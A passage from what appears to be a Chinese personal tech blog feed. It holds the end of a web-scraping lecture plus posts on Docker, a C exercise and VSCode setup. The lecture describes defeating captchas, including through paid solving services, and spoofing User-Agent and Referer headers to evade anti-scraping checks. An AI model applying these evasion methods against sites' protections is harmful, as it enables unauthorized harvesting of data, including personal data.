src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_15410.jpg"></p><p>4.字符切分，制作大小统一的模板库</p><p>利用X轴、Y轴投影（即统计对应坐标上黑色像素点的个数），按照长宽值切分出字符模板库，保存文件到对应字符的文件夹中。其中单个字符切割出来后可以让ocr来识别并存放，会大大提升效率，但也会有些字符识别错误导致分类错误，需要找出并放到对应的文件夹中。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_15411.jpg"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_15412.jpg"></p><p>5.识别</p><p>最后将需要识别的验证码图片，利用OpenCV中的模板匹配方法，设定阈值，筛选最优匹配结果。其中会遇到两种情况，当前阈值多个结果，则提高阈值筛选；当前阈值无结果，则降低阈值匹配。组成识别出的验证码。测试多次，正确率平均达到99.4%。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_15413.jpg"></p><p>(3)机器学习识别。利用SVM、CNN等机器学习算法，制作训练集来识别。</p><p>(4)人工识别。通常网站只需登录一次便可爬取，在其他识别方式不管用时，人工识别一次验证码也是可行的，其实现也非常简单——在Scrapy下载完验证码图片后，调用Image.show方法将图片显示出来，然后调用Python内置的input函数，等待用户肉眼识别后输入识别结果。</p><p>(5)利用大爷大妈打码平台，大概1元钱100个，平台提供了HTTP服务接口，用户可以通过HTTP请求将验证码图片发给平台，平台识别后将结果通过HTTP响应返回。如打码100、超级鹰等。</p><p>5.爬虫框架的使用。</p><p>Requests + Selenium可以解决目前90%的爬虫需求。Scrapy框架是为了让我们的爬虫更强大、更高效，提高生产效率，一些基础的功能都完成了封装，直接调用，不必重复造轮子。</p><p>目前比较主流的有pyspider和Scrapy。推荐使用scrapy。pyspider的可配置化程度不高，异常处理能力有限，对于反爬程度强的网站力不从心。</p><p>Scrapy是一个基于Twisted的异步处理框架，是纯Python实现的爬虫框架，架构清晰、扩展性强、模块化程度高，开发者社区也十分活跃，具有配套的各种插件，可以灵活完成各种需求，几乎可以实现任何站点的爬取逻辑。只需要定制开发几个模块就可以轻松实现一个爬虫。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_20.png"></p><p>这是scrapy的架构图，其实看起来复杂，只是对之前那个简单爬虫每一块形成了封装，并统一调度管理。比如说URL管理封装，防止重复抓取URL和循环抓取URL，如何设置爬取深度；结果储存形式和存储前处理封装；数据解析过程进行封装。</p><p>主要分为五个基本构架：</p><pre><code>调度器：相当于一台电脑的CPU，主要负责调度URL管理器、下载器、解析器之间的协调工作。URL管理器：包括待爬取的URL地址和已爬取的URL地址，防止重复抓取URL和循环抓取URL，实现URL管理器主要用三种方式，通过内存、数据库、缓存数据库来实现。网页下载器：通过传入一个URL地址来下载网页内容网页解析器：将下载下来的网页内容进行解析，可以按照我们的要求来提取出我们有用的信息，也可以根据DOM树的解析方式来解析。网页解析器有正则表达式（直观，将网页转成字符串通过模糊匹配的方式来提取有价值的信息，当文档比较复杂的时候，该方法提取数据的时候就会非常的困难），可以使用html.parser 和 beautifulsoup 以及 lxml ，这些都是以 DOM 树的方式进行解析的。数据存储器：用于将HTML解析器解析出来的数据通过文件或者数据库形式储存起来</code></pre><p>项目结构：</p><pre><code>scrapy.cfg # Scrapy的项目配置文件myproject/ # 项目文件夹，以项目名来命名    __init__.py    items.py # 包含数据容器模型的代码。提供了类似于字典的API、声明可用字段的简单语法。这种简单的容器用于保存爬得的数据。    middlewares.py # 包含下载器中间件和爬虫中间件模型的代码。常用的随机UA头等。    pipelines.py # 数据管道组件，接收item并执行一些行为。    settings.py # 定义项目的全局配置    spiders/ # 爬虫实现        __init__.py        spider1.py        spider2.py        ...</code></pre><p>6.维护和管理爬虫平台。</p><p>对爬虫有规模量级要求的企业或个人需要同时处理不同类别的爬虫，这会凭空增添很多附加的管理成本。同时，爬虫管理者还需要应对网站内容变更、持续增量抓取、任务失败等问题。因此一个成熟的爬虫管理流程应该包含一个管理系统，能够有效处理上述问题。</p><p>Crawlab 和 Scrapyd （scrapydweb、spiderkeeper、gerapy）都是web界面，方便维护和管理。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crawlab1.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crawlab2.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crawlab3.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/crawlab4.png"></p><p>我们目前的数据采集和爬虫管理就是基于Scrapy + Crawlab。</p><p>7.层出不穷的反爬技术。</p><p>之前已经介绍过</p><p>（1）检测ip、限制访问频率 </p><p>（2）登陆以及验证码 </p><p>（3）使用ajax异步加载 </p><p>（4）JS渲染</p><p>还有比较基础的：</p><p>（5）U-A校验</p><p>这是最简单的反爬虫机制应该是U-A校验了。浏览器在发送请求的时候，会附带一部分浏览器及当前系统环境的参数给服务器，这部分数据放在HTTP请求的header部分。只需要爬虫模拟正常浏览器的user-agent即可。python中可以自己找到常见UA随机选取，也可以直接用第三方库fake-useragent。</p><p>（6）referer校验</p><p>referer校验。referer字段可以追溯网站访问来源（一般被称为防盗链），在构造header的时候，传入Referer参数，它的值一般为搜索引擎，或者原网站就可以了。</p><p>（7）蜜罐反爬</p><p>网页上会故意留下一些人类看不到或者绝对不会点击的链接。由于爬虫会从源代码中获取内容，所以爬虫可能会访问这样的链接。这个时候，只要网站发现了有IP访问这个链接，立刻永久封禁该IP + User-Agent + Mac地址等等可以用于识别访问者身份的所有信息。这个时候，访问者即便是把IP换了，也没有办法访问这个网站了。</p><p>比较有趣的反爬虫手段：</p><p>（8）去哪儿网用的 CSS 偏移反爬虫手段，页面展示的数字和html文件里的数字不一致。</p><p>（9）字体反爬，通过调用自定义的ttf文件来渲染网页中的文字，而网页中的文字不再是文字，而是相应的字体编码，通过复制或者简单的采集是无法采集到编码后的文字内容。</p><p>（10）SVG 映射反爬虫，用矢量图形代替具体的文字，不会影响用户正常阅读，但爬虫程序却无法像读取文字那样获得 SVG 图形中的内容。</p><h1 id="五、爬虫法律问题-盗亦有道"><a href="#五、爬虫法律问题-盗亦有道" class="headerlink" title="五、爬虫法律问题 盗亦有道"></a>五、爬虫法律问题 盗亦有道</h1><p>那既然是公开数据，为什么还会有人因为爬虫被抓坐牢呢？因为有些团队或机构，大量收集一些公司或者个人数据，并且因此获利时（或者影响数据生产方利益时），会让数据生产方或者被侵犯的个人很不爽，就会由此产生法律纠纷。爬虫违法主要原因有：</p><p>1.为违法违规组织提供爬虫相关服务</p><p>例如，厦门有个技术宅男杨某，培训AI人工智能学习识别各种验证码，帮助黑客认证个人信息，一年牟利300多万。</p><p>2.个人隐私数据抓取与贩卖</p><p>例如，简历大数据公司“巧达科技”利用某知名互联网公司某个接口，窃取了大量客户信息，用于出售简历数据。</p><p>感兴趣的可以查看，<a href="https://github.com/HiddenStrawberry/Crawler_Illegal_Cases_In_China">中国爬虫违法违规案例汇总</a>，整理了中国大陆爬虫开发者涉诉与违规相关的新闻、资料与法律法规，了解下爬虫禁区。</p><p>成功案例</p><p>有好些公司的商业模式就建立在爬虫技术之上的，比如搜索引擎公司、大数据处理公司、网络舆情监控公司，没有数据，他们的公司就没法运转。google和百度、国民资讯app的今日头条（早期通过抓取数百家机构的新闻源，然后以技术手段来分发给用户，做到千人千面的阅读体验）、天眼查/企查查（ 这两家企业把各个省，市的官方几千万家工商信息抓取出来，结构化整合后提供给用户查询）、很多个人站长、自由职业者都是靠着抓取和整合数据做出了不错的流量和用户，每年有不菲的收入。</p><p>爬虫作为一种技术本身可能无所谓善恶，但是使用它的人就有善恶之分。如何使用爬虫，爬取的数据如何使用，都可能产生潜在的法律问题。无论何种目的，网络爬虫都不能突破法律的底线，守法合规，既是一直自我约束，也是自我保护。</p><h1 id="六、爬虫前景"><a href="#六、爬虫前景" class="headerlink" title="六、爬虫前景"></a>六、爬虫前景</h1><p>现在很多人并不看好爬虫的前景，只搞爬虫的话技术只停留在当前水平，不再学习新知识，不再进步的话，那么是没有前途的，总有一天会被时代淘汰，其实其他职位也只如此。</p><p>第一、如果钻研得够深，爬虫功能很强大，性能很高，扩展性很好等等，那么还是很有前途的。</p><p>第二、爬虫作为数据的来源，后面还有很多方向可以发展，比如可以往大数据分析、数据展示、机器学习等方面发展，现在作为大数据时代，占据在数据的的入口，肯定能够找到发展方向。</p><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p>微软工程师崔庆才 《Python 3 网络爬虫开发实战》</p><p>今年1月刚出的新书《Python 3反爬虫原理与绕过实战》<a href="http://www.porters.vip/">http://www.porters.vip/</a> 作者搭建的反爬虫技术练习平台</p><p>《精通Scrapy网络爬虫》</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_21.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_22.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_23.png"></p><p>本文参考</p><p><a href="https://blog.csdn.net/weixin_42712704/article/details/82995189">https://blog.csdn.net/weixin_42712704/article/details/82995189</a></p><p><a href="https://www.jianshu.com/p/5e6940cff596">https://www.jianshu.com/p/5e6940cff596</a></p><p><a href="https://www.jianshu.com/p/5bb631c1e523">https://www.jianshu.com/p/5bb631c1e523</a></p><p><a href="https://zhuanlan.zhihu.com/p/70633618">https://zhuanlan.zhihu.com/p/70633618</a></p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 容器内服务自启动</title>
      <link href="2020/06/08/2020-06-08-Docker_image_service_self-start/"/>
      <url>2020/06/08/2020-06-08-Docker_image_service_self-start/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-容器内服务自启动"><a href="#Docker-容器内服务自启动" class="headerlink" title="Docker 容器内服务自启动"></a>Docker 容器内服务自启动</h2><p>因为需要在容器中自启动rinetd服务，所以通过以下方式实现：</p><p>在容器里面写rinetd的自启动脚本，然后在启动容器的时候运行该脚本，具体操作如下：</p><p>在容器里</p><pre><code>vi docker_init.sh</code></pre><p>写入</p><pre><code>#!/bin/bash/usr/sbin/rinetd......</code></pre><p>把带有自启动脚本的容器封装为镜像</p><pre><code>docker commit demo ubuntu</code></pre><p>编写Dockerfile</p><pre><code>From demoCMD [ &quot;/bin/sh&quot;,&quot;docker_init.sh&quot;]</code></pre><p>根据Dockerfile构建新镜像即可</p><pre><code>docker buitd -t auto_rinetd .</code></pre><p>之后用auto_rinetd镜像启动的容器，即可自启动rinetd</p><hr><p>当然也可以把自启动脚本这一步全部写到Dockerfile里面：</p><p>Dockerfile内容:</p><pre><code>From ubuntu_demoRUN echo -e &#39;#!/bin/sh\n/usr/sbin/rinetd&#39; &gt;docker_init.sh &amp;&amp;\        chmod 777 docker_init.sh &amp;&amp;\CMD [ &quot;/bin/sh&quot;,&quot;docker_init.sh&quot;]</code></pre><p>然后和上面一样根据Dockerfile构建新镜像即可。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言题目-古风排版</title>
      <link href="2020/06/08/2020-06-08-c_programming_ancient_style_typography/"/>
      <url>2020/06/08/2020-06-08-c_programming_ancient_style_typography/</url>
      
        <content type="html"><![CDATA[<h2 id="C语言题目-古风排版"><a href="#C语言题目-古风排版" class="headerlink" title="C语言题目-古风排版"></a>C语言题目-古风排版</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p>小甲正在研究一种古风排版。</p><p>众所周知，我国的古人写字使用的是从右向左的竖向排版，例如wo ai zhong guo按照每列5个字符排版就应该写成如下格式：</p><pre><code> zwghouo ona gi</code></pre><p>注意从右向左的最后一列如果不足字符，应该补齐空格。</p><p>现在有人告诉你每列的字符数，小甲希望你把所有字符串按照古风格式转换。</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行一个整数k，表示古风格式每列k（1&lt;k&lt;100）个字符。</p><p>第二行一个字符，仅包含大小写字符，空格，和英文感叹号！。为了方便输入，第二行的字符串结尾没有换行符（即没有’\r’或’\n’）。</p><p>保证字符串长度不超过1000。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>输出若干行，每列k个字符，表示转换为古风格式的结果。</p><h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h3><p>5</p><p>wo aizhong guo</p><h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h3><pre><code> zwghouo ona gi</code></pre><h3 id="程序代码"><a href="#程序代码" class="headerlink" title="程序代码"></a>程序代码</h3><pre><code>// 注意事项：1. 读入的时候如果用gets最好判断一下&#39;\r&#39;(本题数据比较友好，实测没有\r卡大家)// 2. 最左边一列没摆满务必补齐空格，实现方式有很多，可以在数组里直接补上空格，或者是二重循环一个一个字符输出，然后遇到\0空字符就输出空格#include &lt;stdio.h&gt;#include &lt;string.h&gt;char gf[1002][1002];char txt[1005];int l, k;void display()&#123;    int i;    for (i = 0; i &lt; k; i++)        printf(&quot;%s\n&quot;, gf[i]);&#125;int main()&#123;    int i, j, p = 0;    char c;    scanf(&quot;%d&quot;, &amp;k);    while (getchar() != &#39;\n&#39;);    gets(txt);    l = strlen(txt);    if (txt[l - 1] == &#39;\r&#39;) txt[--l] = 0;    for (j = l / k + (l % k != 0) - 1, i = 0; p &lt; l; p++)    &#123;        gf[i][j] = txt[p];        i++;        if (i == k)i = 0, j--;    &#125;    for (i = 0; i &lt; k; i++)        if (gf[i][j] == 0)gf[i][j] = &#39; &#39;;    for (i = 0; i &lt; k; i++)        printf(&quot;%s\n&quot;, gf[i]);    return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将本地docker容器迁移到服务端</title>
      <link href="2020/06/08/2020-06-08-migrate_docker_container_to_server/"/>
      <url>2020/06/08/2020-06-08-migrate_docker_container_to_server/</url>
      
        <content type="html"><![CDATA[<h2 id="将本地docker容器迁移到服务端"><a href="#将本地docker容器迁移到服务端" class="headerlink" title="将本地docker容器迁移到服务端"></a>将本地docker容器迁移到服务端</h2><h3 id="从docker容器生成镜像"><a href="#从docker容器生成镜像" class="headerlink" title="从docker容器生成镜像"></a>从docker容器生成镜像</h3><pre><code>docker commit -a &quot;zhaoolee&quot; -m “完成uwsgi的配置” qs zhaoolee-qs:1.0</code></pre><p>参数说明: -a为作者署名, -m为本次提交的内容说明, qs为容器的名称, zhaoolee-qs:1.0表示新生成的镜像名为zhaoolee-qs,镜像zhaoolee-qs版本号为1.0</p><p>从容器生成镜像的时间可以会比较长, 需要耐心等待</p><h3 id="将docker镜像导出为静态文件"><a href="#将docker镜像导出为静态文件" class="headerlink" title="将docker镜像导出为静态文件"></a>将docker镜像导出为静态文件</h3><pre><code>docker save zhaoolee-qs:1.0 &gt; qs01.tar</code></pre><p>zhaoolee-qs:1.0为镜像名, qs01.tar为新生成的静态文件名</p><h3 id="通过将scp将静态文件发送到服务端"><a href="#通过将scp将静态文件发送到服务端" class="headerlink" title="通过将scp将静态文件发送到服务端"></a>通过将scp将静态文件发送到服务端</h3><pre><code>scp ./qs01.tar root@192.168.214.162:/qs01.tar   </code></pre><p>./qs01.tar 表示当前本地路径下的静态文件qs01.tar, <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x32;&#x31;&#x34;&#46;&#49;&#54;&#x32;">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x32;&#x31;&#x34;&#46;&#49;&#54;&#x32;</a>表示以root的身份登录ip为192.168.214.162服务器, :/qs0.tar表示qs01.tar将要存储到远程服务器根目录下,文件名保持为qs01.tar</p><p>scp远程拷贝是一个非常值得掌握的命令, 简单实用, 也可用与脚本编程</p><h3 id="将静态文件还原为镜像-并导入docker"><a href="#将静态文件还原为镜像-并导入docker" class="headerlink" title="将静态文件还原为镜像, 并导入docker"></a>将静态文件还原为镜像, 并导入docker</h3><pre><code>docker load &lt; qs01.tar</code></pre><p>登录192.168.214.162, 进入根目录下(qs01.tar所在的位置), 运行此命令, 即可将镜像恢复, 并导入docker管理器</p><h3 id="从刚刚导入的镜像新建容器"><a href="#从刚刚导入的镜像新建容器" class="headerlink" title="从刚刚导入的镜像新建容器"></a>从刚刚导入的镜像新建容器</h3><pre><code>docker run -t -i --name qs01 -p 3000:80 -p 8000:8000 zhaoolee-qs:1.0 /bin/bash</code></pre><p>小技巧: 退出当前容器环境但不关闭当前容器ctrl+p+q</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 中 VSCode C++环境配置</title>
      <link href="2020/06/08/2020-06-08-linux_vscode_c_env_config/"/>
      <url>2020/06/08/2020-06-08-linux_vscode_c_env_config/</url>
      
        <content type="html"><![CDATA[<p>VS code本身是一个编辑器，所以如果需要调试等功能需要自己安装一些插件，并且配置相关的json文件。</p><p>linux 环境下，g++和clang都可以作为C++的编译器，我这里选择使用的是clang。</p><p>首先是插件选择：</p><p>(1) C/C++ 微软自带的C/C++插件。</p><p>(2) C/C++ Clang Command Adapter：提供静态检测（Lint）</p><p>(3) Code Runner：右键即可编译运行单文件</p><p>(4) Bracket Pair Colorizer：彩虹花括号</p><p>(5) Include Autocomplete：提供头文件名字的补全</p><p>以上插件下载完之后，在文件工作区(workspace) 新建一个文件夹作为你项目的根目录文件，然后新建一个”.vscode” 文件，该文件夹存放相关json的配置文件，其中launch.json 和tasks.json 两个配置文件是必须的，除了这两个之外，还可以加上setting.json。如果setting.json不加设置，就会使用设置，基本上满足使用了。</p><p>关于，launch.json的配置为：</p><pre><code>// https://github.com/Microsoft/vscode-cpptools/blob/master/launch.md&#123;    &quot;version&quot;: &quot;0.2.0&quot;,    &quot;configurations&quot;: [        &#123;            &quot;name&quot;: &quot;(gdb) Launch&quot;, // 配置名称，将会在启动配置的下拉菜单中显示            &quot;type&quot;: &quot;cppdbg&quot;, // 配置类型，这里只能为cppdbg            &quot;request&quot;: &quot;launch&quot;, // 请求配置类型，可以为launch（启动）或attach（附加）            &quot;program&quot;: &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot;, // 将要进行调试的程序的路径            &quot;args&quot;: [], // 程序调试时传递给程序的命令行参数，一般设为空即可            &quot;stopAtEntry&quot;: false, // 设为true时程序将暂停在程序入口处，我一般设置为true            &quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;, // 调试程序时的工作目录            &quot;environment&quot;: [], // （环境变量？）            &quot;externalConsole&quot;: true, // 调试时是否显示控制台窗口，一般设置为true显示控制台            &quot;internalConsoleOptions&quot;: &quot;neverOpen&quot;, // 如果不设为neverOpen，调试时会跳到“调试控制台”选项卡，你应该不需要对gdb手动输命令吧？            &quot;MIMode&quot;: &quot;gdb&quot;, // 指定连接的调试器，可以为gdb或lldb。但目前lldb在windows下没有预编译好的版本。            // &quot;miDebuggerPath&quot;: &quot;gdb.exe&quot;, // 调试器路径，Windows下后缀不能省略，Linux下则去掉            &quot;setupCommands&quot;: [ // 用处未知，模板如此                &#123;                    &quot;description&quot;: &quot;Enable pretty-printing for gdb&quot;,                    &quot;text&quot;: &quot;-enable-pretty-printing&quot;,                    &quot;ignoreFailures&quot;: false                &#125;            ],            &quot;preLaunchTask&quot;: &quot;Compile&quot; // 调试会话开始前执行的任务，一般为编译程序。与tasks.json的label相对应        &#125;    ]&#125;</code></pre><p>tasks.json的配置为：</p><pre><code>// https://code.visualstudio.com/docs/editor/tasks&#123;    &quot;version&quot;: &quot;2.0.0&quot;,    &quot;tasks&quot;: [        &#123;            &quot;label&quot;: &quot;Compile&quot;, // 任务名称，与launch.json的preLaunchTask相对应            &quot;command&quot;: &quot;clang++&quot;, // 要使用的编译器 clang++  或者g++            &quot;args&quot;: [                &quot;$&#123;file&#125;&quot;,                &quot;-o&quot;, // 指定输出文件名，不加该参数则默认输出a.exe，Linux下默认a.out                &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot;,                &quot;-g&quot;, // 生成和调试有关的信息                &quot;-Wall&quot;, // 开启额外警告                &quot;-static-libgcc&quot;, // 静态链接                // &quot;-fcolor-diagnostics&quot;, // 彩色的错误信息？但貌似clang默认开启而gcc不接受此参数                // &quot;--target=x86_64-w64-mingw&quot;, // clang的默认target为msvc，不加这一条就会找不到头文件；Linux下去掉这一条                &quot;-std=c++11&quot; // C语言最新标准为c11，或根据自己的需要进行修改            ], // 编译命令参数            &quot;type&quot;: &quot;shell&quot;, // 可以为shell或process，前者相当于先打开shell再输入命令，后者是直接运行命令            &quot;group&quot;: &#123;                &quot;kind&quot;: &quot;build&quot;,                &quot;isDefault&quot;: true // 设为false可做到一个tasks.json配置多个编译指令，需要自己修改本文件，我这里不多提            &#125;,            &quot;presentation&quot;: &#123;                &quot;echo&quot;: true,                &quot;reveal&quot;: &quot;always&quot;, // 在“终端”中显示编译信息的策略，可以为always，silent，never。具体参见VSC的文档                &quot;focus&quot;: false, // 设为true后可以使执行task时焦点聚集在终端，但对编译c和c++来说，设为true没有意义                &quot;panel&quot;: &quot;shared&quot; // 不同的文件的编译信息共享一个终端面板            &#125;            // &quot;problemMatcher&quot;:&quot;$gcc&quot; // 如果你不使用clang，去掉前面的注释符，并在上一条之后加个逗号。照着我的教程做的不需要改（也可以把这行删去)        &#125;    ]&#125;</code></pre><p>ctrl+shift+B是编译，按F5是编译+运行。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习记录</title>
      <link href="2020/06/08/2020-06-08-learn_docker/"/>
      <url>2020/06/08/2020-06-08-learn_docker/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker学习记录"><a href="#Docker学习记录" class="headerlink" title="Docker学习记录"></a>Docker学习记录</h2><p>参考资料：</p><p><a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p><p><a href="https://zhuanlan.zhihu.com/p/23599229">https://zhuanlan.zhihu.com/p/23599229</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Docker是一个虚拟环境容器，可以将你的开发环境、代码、配置文件等一并打包到这个容器中，并发布和应用到任意平台中。比如，你在本地用Python开发网站后台，开发测试完成后，就可以将Python3及其依赖包、Flask及其各种插件、Mysql、Nginx等打包到一个容器中，然后部署到任意你想部署到的环境。</p><p><a href="https://docs.docker.com/">官方文档</a></p><p><a href="https://github.com/moby/moby">Docker Github地址</a></p><p><a href="https://hub.docker.com/">docker官方镜像仓库</a></p><p><a href="https://yeasy.gitbook.io/docker_practice/">Docker —— 从入门到实践</a></p><h3 id="为什么要用Docker"><a href="#为什么要用Docker" class="headerlink" title="为什么要用Docker"></a>为什么要用Docker</h3><p>Docker和容器技术为什么会这么火爆？说白了，就是因为它“轻”。</p><p>在容器技术之前，业界的网红是虚拟机。大家都用过虚拟机，但虚拟机占用空间更大，启动更慢，虚拟机软件可能还要花钱（例如VMWare）。而容器技术恰好没有这些缺点。它不需要虚拟出整个操作系统，只需要虚拟一个小规模的环境（类似“沙箱”）。它启动时间很快，几秒钟就能完成。而且，它对资源的利用率很高（一台主机可以同时运行几千个Docker容器）。此外，它占的空间很小，虚拟机一般要几GB到几十GB的空间，而容器只需要MB级甚至KB级。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/virtualization456456.png" alt="传统虚拟化"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/docker45646345.png" alt="Docker"></p><h3 id="docker三个重要概念：镜像、容器、仓库"><a href="#docker三个重要概念：镜像、容器、仓库" class="headerlink" title="docker三个重要概念：镜像、容器、仓库"></a>docker三个重要概念：镜像、容器、仓库</h3><p>镜像（Image）：类似于虚拟机中的镜像，是一个包含有文件系统的面向Docker引擎的只读模板。任何应用程序运行都需要环境，而镜像就是用来提供这种运行环境的。例如一个Ubuntu镜像就是一个包含Ubuntu操作系统环境的模板，同理在该镜像上装上Apache软件，就可以称为Apache镜像。</p><p>容器（Container）：类似于一个轻量级的沙盒，可以将其看作一个极简的Linux系统环境（包括root权限、进程空间、用户空间和网络空间等），以及运行在其中的应用程序。Docker引擎利用容器来运行、隔离各个应用。容器是镜像创建的应用实例，可以创建、启动、停止、删除容器，各个容器之间是是相互隔离的，互不影响。注意：镜像本身是只读的，容器从镜像启动时，Docker在镜像的上层创建一个可写层，镜像本身不变。</p><p>仓库（Repository）：类似于代码仓库，这里是镜像仓库，是Docker用来集中存放镜像文件的地方。注意与注册服务器（Registry）的区别：注册服务器是存放仓库的地方，一般会有多个仓库；而仓库是存放镜像的地方，一般每个仓库存放一类镜像，每个镜像利用tag进行区分，比如Ubuntu仓库存放有多个版本（12.04、14.04等）的Ubuntu镜像。</p><h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><p><a href="https://docs.docker.com/engine/install/ubuntu/">ubuntu安装</a></p><p><a href="https://docs.docker.com/docker-for-windows/install/">windows安装</a></p><h3 id="配置镜像加速器"><a href="#配置镜像加速器" class="headerlink" title="配置镜像加速器"></a>配置镜像加速器</h3><p>国内从 Docker Hub 拉取镜像有时会遇到困难，此时可以配置镜像加速器，由于镜像服务可能出现宕机，建议同时配置多个镜像。国内很多云服务商都提供了国内加速器服务，例如：</p><ul><li><p>网易云加速器 <a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com</a></p></li><li><p>百度云加速器 <a href="https://mirror.baidubce.com/">https://mirror.baidubce.com</a></p></li></ul><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><p>在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在请新建该文件）。注意，一定要保证该文件符合 json 规范，否则 Docker 将不能启动。</p><pre><code>&#123;&quot;registry-mirrors&quot;: [    &quot;https://hub-mirror.c.163.com&quot;,    &quot;https://mirror.baidubce.com&quot;]&#125;</code></pre><p>之后重新启动服务。</p><pre><code>$ sudo systemctl daemon-reload$ sudo systemctl restart docker</code></pre><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>在任务栏托盘 Docker 图标内右键菜单选择 Settings，打开配置窗口后在左侧导航菜单选择 Docker Engine，在右侧像下边一样编辑 json 文件，之后点击 Apply &amp; Restart 保存后 Docker 就会重启并应用配置的镜像地址了。</p><pre><code>&#123;&quot;registry-mirrors&quot;: [    &quot;https://hub-mirror.c.163.com&quot;,    &quot;https://mirror.baidubce.com&quot;]&#125;</code></pre><h3 id="docker-入门操作"><a href="#docker-入门操作" class="headerlink" title="docker 入门操作"></a>docker 入门操作</h3><h4 id="查看Docker的版本信息"><a href="#查看Docker的版本信息" class="headerlink" title="查看Docker的版本信息"></a>查看Docker的版本信息</h4><pre><code>docker version</code></pre><h4 id="查看Docker的帮助信息"><a href="#查看Docker的帮助信息" class="headerlink" title="查看Docker的帮助信息"></a>查看Docker的帮助信息</h4><pre><code>docker --help</code></pre><h4 id="查看ubuntu镜像是否存在"><a href="#查看ubuntu镜像是否存在" class="headerlink" title="查看ubuntu镜像是否存在"></a>查看ubuntu镜像是否存在</h4><pre><code>$ docker search ubuntuNAME                                                      DESCRIPTION                                     STARS               OFFICIAL            AUTOMATEDubuntu                                                    Ubuntu is a Debian-based Linux operating sys…   10960               [OK]                dorowu/ubuntu-desktop-lxde-vnc                            Docker image to provide HTML5 VNC interface …   433                                     [OK]rastasheep/ubuntu-sshd                                    Dockerized SSH service, built on top of offi…   244                                     [OK]consol/ubuntu-xfce-vnc                                    Ubuntu container with &quot;headless&quot; VNC session…   219                                     [OK]ubuntu-upstart                                            Upstart is an event-based replacement for th…   109                 [OK]                neurodebian                                               NeuroDebian provides neuroscience research s…   68                  [OK]                ...</code></pre><h4 id="利用pull命令获取镜像"><a href="#利用pull命令获取镜像" class="headerlink" title="利用pull命令获取镜像"></a>利用pull命令获取镜像</h4><p>命令格式为：</p><pre><code>docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]</code></pre><ul><li><p>Docker 镜像仓库地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号]。默认地址是 Docker Hub。</p></li><li><p>仓库名：如之前所说，这里的仓库名是两段式名称，即 &lt;用户名&gt;/&lt;软件名&gt;。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。</p></li></ul><p>我们通过以下命令获取ubuntu 18.04镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 